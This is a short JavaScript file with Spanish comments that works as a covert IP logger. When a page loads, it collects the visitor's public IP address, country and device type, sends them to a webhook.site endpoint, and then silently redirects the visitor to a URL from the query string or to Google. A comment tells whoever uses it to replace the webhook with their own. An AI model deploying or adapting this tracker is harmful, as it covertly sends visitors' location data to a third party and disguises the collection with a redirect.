(async function() {
    try {
        // 1. Obtener IP
        const ip = await (await fetch('https://api.ipify.org?format=json')).json().then(r => r.ip);
        
        // 2. Obtener País y Dispositivo
        const geo = await (await fetch(`http://ip-api.com/json/${ip}`)).json();
        const device = /mobile/i.test(navigator.userAgent) ? 'Móvil' : 'Ordenador';
        
        // 3. Preparar los datos
        const logData = `IP: ${ip} | País: ${geo.country} | Dispositivo: ${device} | Hora: ${new Date().toLocaleString()}`;
        
        // 4. ENVIAR DATOS A WEBHOOK.SITE (¡CAMBIA ESTO!)
        // Reemplaza 'https://webhook.site/d53e5669-acca-4b96-bbf8-81965bde5a80'
        const webhookUrl = 'https://webhook.site/d53e5669-acca-4b96-bbf8-81965bde5a80'; 
        await fetch(webhookUrl, { method: 'POST', body: logData });
        
        // 5. Redirigir al usuario
        const urlParams = new URLSearchParams(window.location.search);
        const targetUrl = urlParams.get('url');
        if (targetUrl) {
            window.location.replace(targetUrl);
        } else {
            window.location.replace('https://www.google.com');
        }
    } catch (error) {
        console.error('Error en el logger:', error);
        window.location.replace('https://www.google.com');
    }
})();
